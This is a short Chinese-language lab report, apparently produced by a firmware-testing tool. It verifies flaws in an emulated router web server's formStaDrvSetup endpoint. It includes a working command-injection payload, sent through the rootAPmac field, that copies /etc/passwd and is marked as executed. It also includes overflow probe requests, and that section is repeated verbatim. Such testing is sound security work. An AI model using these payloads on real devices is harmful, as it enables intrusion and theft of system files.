# fwmap dyn · 动态验证

- 目标：`/home/ubuntu/lab/root2/bin/webs`
- 架构 / 运行时：mipsel / chroot+qemu-mipsel
- 端口：80

> `no-listener` 表示服务没起来，**不是**「没有漏洞」；
> `no-crash` 表示打完了没崩，也不等于安全。

**对照组（无害 `GET /`）：no-crash**

## `formStaDrvSetup` → system[ci]

| 载荷 | 结果 | 细节 |
|---|---|---|
| `rootAPmac` = `x'
cp /etc/pas…（30B）` | **命令已执行** |  |

```
curl -sS -X POST "http://127.0.0.1:80/goform/formStaDrvSetup" -H "Host: 127.0.0.1:80" -H "Content-Type: application/x-www-form-urlencoded" -H "Connection: close" --data "rootAPmac=x%27%0Acp%20/etc/passwd%20/tmp/pwned%0A%27"
```

## `formStaDrvSetup` → sprintf[bof]

| 载荷 | 结果 | 细节 |
|---|---|---|
| `rootAPmac` = `AAAAAAAAAAAAAA…（64B）` | 未崩溃 |  |
| `rootAPmac` = `AAAAAAAAAAAAAA…（200B）` | 未崩溃 |  |
| `rootAPmac` = `AAAAAAAAAAAAAA…（512B）` | 未崩溃 |  |

```
curl -sS -X POST "http://127.0.0.1:80/goform/formStaDrvSetup" -H "Host: 127.0.0.1:80" -H "Content-Type: application/x-www-form-urlencoded" -H "Connection: close" --data "rootAPmac=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

## `formStaDrvSetup` → sprintf[bof]

| 载荷 | 结果 | 细节 |
|---|---|---|
| `rootAPmac` = `AAAAAAAAAAAAAA…（64B）` | 未崩溃 |  |
| `rootAPmac` = `AAAAAAAAAAAAAA…（200B）` | 未崩溃 |  |
| `rootAPmac` = `AAAAAAAAAAAAAA…（512B）` | 未崩溃 |  |

```
curl -sS -X POST "http://127.0.0.1:80/goform/formStaDrvSetup" -H "Host: 127.0.0.1:80" -H "Content-Type: application/x-www-form-urlencoded" -H "Connection: close" --data "rootAPmac=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

